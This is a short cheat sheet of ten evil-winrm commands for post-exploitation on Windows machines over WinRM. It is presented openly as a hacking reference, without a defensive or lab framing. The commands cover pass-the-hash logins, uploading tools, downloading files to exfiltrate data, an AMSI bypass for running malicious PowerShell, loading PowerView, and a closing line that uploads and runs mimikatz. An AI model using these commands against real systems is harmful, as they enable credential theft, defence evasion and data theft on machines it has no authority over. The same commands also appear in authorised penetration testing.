---
title: Evil-winrm Command List
date: 2026-01-05
category: commands
enrich: false
tags: evil-winrm, cybersecurity, command reference, ad
description: Top 10 essential commands for evil-winrm.
---

# Evil-WinRM Command Guide

**Evil-WinRM** is the ultimate shell for hacking Windows Remote Management (WinRM). It provides a PowerShell interface with built-in post-exploitation features.

## Top 10 Useful Commands

### 1. Basic Connect
```bash
evil-winrm -i 10.10.10.10 -u user -p pass
```
**Explanation:** Standard login.

### 2. Pass The Hash
```bash
evil-winrm -i 10.10.10.10 -u user -H <NTLM_HASH>
```
**Explanation:** Login without a password if you have the hash.

### 3. Upload File
```bash
*Evil-WinRM* PS > upload /local/path/file.exe
```
**Explanation:** Built-in upload command (no certutil needed).

### 4. Download File
```bash
*Evil-WinRM* PS > download C:\Windows\System32\drivers\etc\hosts
```
**Explanation:** Exfiltrate data.

### 5. Load Scripts (Bypass AMSI)
```bash
*Evil-WinRM* PS > Bypass-4MSI
```
**Explanation:** Execute built-in AMSI bypass to run unsigned malicious powershell.

### 6. Menu (Features)
```bash
*Evil-WinRM* PS > menu
```
**Explanation:** Show loaded modules (Invoke-Binary, DllInjection, etc).

### 7. Load Powershell Script
```bash
evil-winrm -i ... -s /path/to/scripts/
```
**Explanation:** Load a directory of .ps1 scripts (like PowerView) at startup.

### 8. Execute Loaded Script
```bash
*Evil-WinRM* PS > Invoke-PowerView
```
**Explanation:** Run a script loaded via `-s`.

### 9. Service Mode
```bash
*Evil-WinRM* PS > services
```
**Explanation:** List audio/process services.

### 10. SSL
```bash
evil-winrm -i 10.10.10.10 -S
```
**Explanation:** Force SSL (valid for port 5986).

## The Most Powerful Command
(Interactive):
```bash
upload /path/to/mimikatz.exe; ./mimikatz.exe
```
**Explanation:** Evil-WinRM makes file transfer and execution trivial, making it the best C2 for WinRM.

